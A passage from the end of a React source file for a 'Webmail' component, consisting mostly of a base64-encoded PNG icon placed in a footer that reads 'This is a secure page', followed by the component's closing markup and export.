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"
                alt=""
                style={{
                  width: "30px",
                  marginBottom: "-5px",
                  marginTop: "0px",
                }}
              />
              This is a secure page
            </p>
          </section>
        </div>
      </footer>
    </Fragment>
  );
}

export default Webmail;
